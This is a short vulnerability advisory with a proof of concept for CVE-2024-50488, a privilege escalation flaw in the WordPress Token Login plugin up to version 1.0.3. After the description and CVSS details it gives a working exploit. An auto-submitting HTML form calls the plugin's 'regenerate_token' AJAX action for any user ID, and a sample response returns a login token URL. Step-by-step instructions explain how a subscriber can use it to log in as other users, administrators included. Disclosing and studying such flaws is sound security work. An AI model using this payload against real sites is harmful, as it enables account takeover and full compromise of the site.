# CVE-2024-50488
Token Login &lt;= 1.0.3 - Authenticated (Subscriber+) Privilege Escalation


# Description:
The Auto Login using a secure tokenized url. Role wise login restriction. plugin for WordPress is vulnerable to privilege escalation via account takeover in all versions up to, and including, 1.0.3. This is due to the plugin not properly verifying if a user has permissions to generate a login token for other users. This makes it possible for authenticated attackers, with subscriber-level access and above, to log in as other using including administrators.

```
Published: 2024-10-25 00:00:00
CVE: CVE-2024-50488
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
CVSS Score: 8.8
Slugs: token-login
```

POC
---

Logged in run this HTML submit.
Change the url to the wordpress site your logged in on.
Change the ID to the user you want to generate the token for.
copy the url and you can login as them

```
<html>
  <body>
    <form action="http://kubernetes.docker.internal/wp-admin/admin-ajax.php" method="POST">
      <input type="hidden" name="action" value="tl&#95;admin&#95;ajax&#95;action" />
      <input type="hidden" name="method" value="regenerate&#95;token" />
      <input type="hidden" name="user&#95;id" value="7" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Responce

```
{"status":"success","message":"Successfully regenerated token!","token_url":"http:\/\/kubernetes.docker.internal?__token__=1c8dc9406bc444d1f5cea37fae130f92"}
```
